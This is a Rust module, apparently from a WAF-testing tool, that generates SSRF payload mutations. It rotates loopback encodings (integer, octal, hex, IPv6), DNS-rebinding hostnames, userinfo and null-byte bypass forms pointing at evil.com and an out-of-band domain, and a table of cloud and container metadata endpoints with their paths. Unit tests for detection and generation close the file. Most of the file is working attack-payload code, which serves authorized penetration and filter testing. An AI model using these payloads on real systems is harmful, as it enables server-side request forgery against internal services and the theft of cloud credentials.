//! SSRF grammar-aware payload mutation.
//!
//! Generates URL and host mutations that preserve the core SSRF target class
//! while rotating address notation, scheme handling, redirect tricks, and
//! metadata hostnames that often bypass naive filters.
//!
//! # Strategies
//!
//! 1. IPv4 integer, octal, and hexadecimal host encodings
//! 2. Loopback-oriented IPv6 variants
//! 3. DNS rebinding-style hostnames
//! 4. URL shorthand and scheme tricks
//! 5. Userinfo and fragment redirect bypass forms
//! 6. Cloud metadata endpoint substitutions (AWS, GCP, Azure, DigitalOcean)
//! 7. Percent-encoded dotted-quad hosts
//! 8. Configurable OOB (out-of-band) interaction domains

use std::collections::BTreeSet;
use std::sync::OnceLock;

/// Environment variable name for custom OOB domain.
pub const OOB_DOMAIN_ENV: &str = "WAFRIFT_OOB_DOMAIN";
/// Default OOB domain when not configured.
pub const DEFAULT_OOB_DOMAIN: &str = "oob.example.com";

/// Get the configured OOB domain from environment or use default.
#[must_use]
pub fn get_oob_domain() -> &'static str {
    static OOB_DOMAIN: OnceLock<String> = OnceLock::new();
    OOB_DOMAIN.get_or_init(|| {
        std::env::var(OOB_DOMAIN_ENV).unwrap_or_else(|_| DEFAULT_OOB_DOMAIN.to_string())
    })
}



/// Cloud metadata endpoints for SSRF testing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MetadataEndpoint {
    /// AWS EC2 metadata service
    Aws,
    /// AWS Lambda runtime API
    AwsLambda,
    /// Google Compute Engine metadata
    Gcp,
    /// Azure Instance Metadata Service
    Azure,
    /// Azure WireServer (Windows Azure Agent)
    AzureWireServer,
    /// DigitalOcean metadata service
    DigitalOcean,
    /// Alibaba Cloud metadata
    Alibaba,
    /// Oracle Cloud metadata
    Oracle,
    /// OpenStack metadata
    OpenStack,
    /// Kubernetes service account
    Kubernetes,
    /// Docker containerd
    Docker,
}

impl MetadataEndpoint {
    /// Get the hostname/IP for this metadata endpoint.
    #[must_use]
    pub fn host(&self) -> &'static str {
        match self {
            Self::Aws => "169.254.169.254",
            Self::AwsLambda => "localhost:9001",
            Self::Gcp => "metadata.google.internal",
            Self::Azure => "169.254.169.254",
            Self::AzureWireServer => "168.63.129.16",
            Self::DigitalOcean => "169.254.169.254",
            Self::Alibaba => "100.100.100.200",
            Self::Oracle => "169.254.169.254",
            Self::OpenStack => "169.254.169.254",
            Self::Kubernetes => "kubernetes.default.svc",
            Self::Docker => "172.17.0.1",
        }
    }

    /// Get the typical metadata path for this endpoint.
    #[must_use]
    pub fn metadata_path(&self) -> &'static str {
        match self {
            Self::Aws => "/latest/meta-data/",
            Self::AwsLambda => "/2018-06-01/runtime/invocation/next",
            Self::Gcp => "/computeMetadata/v1/",
            Self::Azure => "/metadata/instance?api-version=2021-02-01",
            Self::AzureWireServer => "/machine/?comp=goalstate",
            Self::DigitalOcean => "/metadata/v1.json",
            Self::Alibaba => "/latest/meta-data/",
            Self::Oracle => "/opc/v1/instance/",
            Self::OpenStack => "/openstack/2018-08-27/meta_data.json",
            Self::Kubernetes => "/api/v1/namespaces/default/pods",
            Self::Docker => "/v1.24/containers/json",
        }
    }

    /// Get all supported metadata endpoints.
    #[must_use]
    pub fn all() -> &'static [Self] {
        &[
            Self::Aws,
            Self::AwsLambda,
            Self::Gcp,
            Self::Azure,
            Self::AzureWireServer,
            Self::DigitalOcean,
            Self::Alibaba,
            Self::Oracle,
            Self::OpenStack,
            Self::Kubernetes,
            Self::Docker,
        ]
    }
}

/// Generate semantic-preserving SSRF mutations for a candidate payload.
#[must_use]
pub fn mutate(payload: &str) -> Vec<String> {
    if payload.is_empty() || !detect_type(payload) {
        return Vec::new();
    }

    let scheme = extract_scheme(payload).unwrap_or("http://");
    let oob_domain = get_oob_domain();
    let mut results = BTreeSet::new();

    // Address encoding variants
    for variant in [
        format!("{scheme}2130706433"),              // IPv4 as integer
        format!("{scheme}0177.0.0.1"),              // Octal notation
        format!("{scheme}0x7f000001"),              // Hexadecimal
        format!("{scheme}[::1]"),                   // IPv6 loopback
        format!("{scheme}[::ffff:127.0.0.1]"),      // IPv4-mapped IPv6
        format!("{scheme}[0:0:0:0:0:ffff:7f00:1]"), // Full IPv4-mapped IPv6
        format!("{scheme}[::ffff:7f00:1]"),         // Compressed IPv4-mapped
        format!("{scheme}[0:0:0:0:0:0:0:1]"),       // Full IPv6 loopback
        format!("{scheme}127.0.0.1.nip.io"),        // DNS rebinding
        format!("{scheme}127.0.0.1.xip.io"),        // Alternative DNS rebinding
        format!("{scheme}spoofed.{oob_domain}"),    // OOB domain
        format!("{scheme}localhost"),               // Localhost name
        format!("{scheme}127.1"),                   // Short form
        format!("{scheme}0"),                       // Zero IP
        format!("{scheme}0.0.0.0"),                 // Any address
        format!("{scheme}127.0.0.2"),               // Alternative loopback
        format!("{scheme}127.127.127.127"),         // Pattern loopback
    ] {
        results.insert(variant);
    }

    // Cloud metadata endpoints
    for endpoint in MetadataEndpoint::all() {
        results.insert(format!("{scheme}{}", endpoint.host()));
    }

    // Redirect/userinfo bypass variants
    for variant in [
        format!("{scheme}evil.com@127.0.0.1"),    // Userinfo bypass
        format!("{scheme}127.0.0.1%23@evil.com"), // Fragment bypass
        format!("{scheme}127.0.0.1%2F@evil.com"), // Path encoding bypass
        format!("{scheme}127.0.0.1?@evil.com"),   // Query bypass
        format!("{scheme}127.0.0.1///@evil.com"), // Multiple slash bypass
        format!("{scheme}////127.0.0.1"),         // Leading slash bypass
        format!("{scheme}127.0.0.1%00.evil.com"), // Null byte bypass
    ] {
        results.insert(variant);
    }

    // Percent-encoded variants
    for variant in [
        format!("{scheme}%31%32%37.%30.%30.%31"), // Double-encoded 127.0.0.1
        format!("{scheme}%37%66%30%30%30%30%30%31"), // Hex 0x7f000001
        format!("{scheme}127%2e0%2e0%2e1"),       // Partial encoding
        format!("{scheme}%6C%6F%63%61%6C%68%6F%73%74"), // Encoded 'localhost'
    ] {
        results.insert(variant);
    }

    if let Some(path_start) = extract_path(payload) {
        let suffix = &payload[path_start..];
        add_with_suffix(&mut results, scheme, oob_domain, suffix);
    }

    results.remove(payload);
    results.into_iter().collect()
}

/// Detect whether a payload looks like an SSRF URL or host reference.
#[must_use]
pub fn detect_type(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();

    // Scheme-based detection
    if lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("ftp://")
        || lower.contains("file://")
        || lower.contains("gopher://")
        || lower.contains("dict://")
        || payload.starts_with("//")
    {
        return true;
    }

    // IPv4 loopback patterns
    if looks_like_ipv4(payload) {
        return true;
    }

    // Known SSRF targets
    if lower.contains("localhost")
        || lower.contains("127.")
        || lower.contains("0.0.0.0")
        || lower.contains("::1")
        || lower.contains("[::]")
        || lower.contains("169.254.169.254")  // AWS/EC2 metadata
        || lower.contains("metadata.google")
        || lower.contains("metadata.azure")
        || lower.contains("100.100.100.200") // Alibaba
        || lower.contains("168.63.129.16")    // Azure WireServer
        || lower.contains("kubernetes.default")
        || lower.contains("172.17.0.1")
    // Docker bridge
    {
        return true;
    }

    // Internal/private IP ranges
    if lower.contains("10.") || lower.contains("192.168.") {
        // Check for private range patterns
        if is_private_ip(&lower) {
            return true;
        }
    }

    false
}

fn is_private_ip(lower: &str) -> bool {
    // 10.0.0.0/8
    if lower.contains("10.") {
        return true;
    }
    // 172.16.0.0/12
    if lower.contains("172.") {
        // More specific check for 172.16-31.x.x
        for i in 16..=31 {
            if lower.contains(&format!("172.{i}.")) {
                return true;
            }
        }
    }
    // 192.168.0.0/16
    if lower.contains("192.168.") {
        return true;
    }
    false
}

fn extract_scheme(payload: &str) -> Option<&str> {
    [
        "http://",
        "https://",
        "ftp://",
        "file://",
        "gopher://",
        "dict://",
    ]
    .into_iter()
    .find(|scheme| payload.to_ascii_lowercase().starts_with(scheme))
}

fn extract_path(payload: &str) -> Option<usize> {
    let scheme_end = payload.find("://").map_or(0, |index| index + 3);
    payload[scheme_end..]
        .find('/')
        .map(|offset| scheme_end + offset)
}

fn add_with_suffix(results: &mut BTreeSet<String>, scheme: &str, oob_domain: &str, suffix: &str) {
    for variant in [
        format!("{scheme}2130706433{suffix}"),
        format!("{scheme}0177.0.0.1{suffix}"),
        format!("{scheme}0x7f000001{suffix}"),
        format!("{scheme}[::1]{suffix}"),
        format!("{scheme}[::ffff:127.0.0.1]{suffix}"),
        format!("{scheme}127.0.0.1.nip.io{suffix}"),
        format!("{scheme}spoofed.{oob_domain}{suffix}"),
        format!("{scheme}169.254.169.254{suffix}"),
        format!("{scheme}metadata.google.internal{suffix}"),
        format!("{scheme}metadata.azure{suffix}"),
        format!("{scheme}100.100.100.200{suffix}"), // Alibaba
        format!("{scheme}168.63.129.16{suffix}"),   // Azure WireServer
        format!("{scheme}172.17.0.1{suffix}"),      // Docker
        format!("{scheme}%31%32%37.%30.%30.%31{suffix}"),
    ] {
        results.insert(variant);
    }
}

fn looks_like_ipv4(payload: &str) -> bool {
    let host = strip_scheme_and_path(payload);
    let parts: Vec<&str> = host.split('.').collect();
    if parts.len() != 4 {
        return false;
    }

    parts.iter().all(|part| {
        !part.is_empty() && part.chars().all(|ch| ch.is_ascii_digit()) && part.parse::<u8>().is_ok()
    })
}

fn strip_scheme_and_path(payload: &str) -> &str {
    let without_scheme = if let Some(index) = payload.find("://") {
        &payload[index + 3..]
    } else if let Some(rest) = payload.strip_prefix("//") {
        rest
    } else {
        payload
    };

    without_scheme
        .split(['/', '?', '#'])
        .next()
        .unwrap_or(without_scheme)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_http_url() {
        assert!(detect_type("http://127.0.0.1/admin"));
        assert!(detect_type("https://example.com"));
    }

    #[test]
    fn detects_ftp_and_file_urls() {
        assert!(detect_type("ftp://127.0.0.1/"));
        assert!(detect_type("file:///etc/passwd"));
        assert!(detect_type("gopher://127.0.0.1/"));
    }

    #[test]
    fn detects_bare_ip() {
        assert!(detect_type("127.0.0.1"));
        assert!(detect_type("192.168.1.1"));
        assert!(detect_type("10.0.0.1"));
    }

    #[test]
    fn detects_aws_metadata() {
        assert!(detect_type("http://169.254.169.254/"));
        assert!(detect_type("169.254.169.254"));
    }

    #[test]
    fn detects_gcp_metadata() {
        assert!(detect_type("http://metadata.google.internal/"));
        assert!(detect_type("metadata.google.internal"));
    }

    #[test]
    fn detects_azure_metadata() {
        assert!(detect_type("http://169.254.169.254/metadata/instance"));
        assert!(detect_type("http://168.63.129.16/machine/"));
    }

    #[test]
    fn detects_alibaba_metadata() {
        assert!(detect_type("http://100.100.100.200/latest/meta-data/"));
    }

    #[test]
    fn detects_docker_internal() {
        assert!(detect_type("http://172.17.0.1/"));
        assert!(detect_type("172.17.0.1"));
    }

    #[test]
    fn detects_kubernetes_internal() {
        assert!(detect_type("https://kubernetes.default.svc/api"));
    }

    #[test]
    fn detects_ipv6_loopback() {
        assert!(detect_type("http://[::1]/"));
        assert!(detect_type("[::1]"));
    }

    #[test]
    fn detects_private_ranges() {
        assert!(detect_type("10.0.0.1"));
        assert!(detect_type("10.255.255.255"));
        assert!(detect_type("172.16.0.1"));
        assert!(detect_type("172.31.255.255"));
        assert!(detect_type("192.168.0.1"));
        assert!(detect_type("192.168.255.255"));
    }

    #[test]
    fn rejects_non_url_text() {
        assert!(!detect_type("not a network target"));
        assert!(!detect_type("hello world"));
    }

    #[test]
    fn generates_ip_encoding_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("2130706433")));
        assert!(mutations.iter().any(|item| item.contains("0177.0.0.1")));
        assert!(mutations.iter().any(|item| item.contains("0x7f000001")));
    }

    #[test]
    fn generates_ipv6_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("[::1]")));
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("[::ffff:127.0.0.1]"))
        );
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("[0:0:0:0:0:ffff:7f00:1]"))
        );
    }

    #[test]
    fn generates_dns_rebinding_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("nip.io")));
        assert!(mutations.iter().any(|item| item.contains("xip.io")));
    }

    #[test]
    fn generates_oob_domain_variants() {
        // OOB domain is read from env at first access and cached
        // Default domain should always be present in mutations
        let mutations = mutate("http://127.0.0.1/");
        // The default domain should be in the mutations list
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("oob.example.com"))
        );
    }

    #[test]
    fn generates_aws_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("169.254.169.254"))
        );
    }

    #[test]
    fn generates_gcp_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("metadata.google.internal"))
        );
    }

    #[test]
    fn generates_azure_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("168.63.129.16")));
    }

    #[test]
    fn generates_alibaba_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("100.100.100.200"))
        );
    }

    #[test]
    fn generates_docker_metadata_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(mutations.iter().any(|item| item.contains("172.17.0.1")));
    }

    #[test]
    fn generates_scheme_tricks() {
        let mutations = mutate("https://127.0.0.1/login");
        assert!(
            mutations
                .iter()
                .any(|item| item.starts_with("https://localhost"))
        );
        assert!(
            mutations
                .iter()
                .any(|item| item.starts_with("https://127.1"))
        );
        assert!(mutations.iter().any(|item| item.starts_with("https://0")));
    }

    #[test]
    fn generates_redirect_bypass_variants() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("evil.com@127.0.0.1"))
        );
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("127.0.0.1%23@evil.com"))
        );
    }

    #[test]
    fn generates_double_encoded_variant() {
        let mutations = mutate("http://127.0.0.1/");
        assert!(
            mutations
                .iter()
                .any(|item| item.contains("%31%32%37.%30.%30.%31"))
        );
    }

    #[test]
    fn all_metadata_endpoints_have_hosts() {
        for endpoint in MetadataEndpoint::all() {
            assert!(!endpoint.host().is_empty());
            assert!(!endpoint.metadata_path().is_empty());
        }
    }

    #[test]
    fn empty_payload_returns_empty() {
        assert!(mutate("").is_empty());
    }

    #[test]
    fn non_ssrf_payload_returns_empty() {
        assert!(mutate("hello world").is_empty());
    }
}
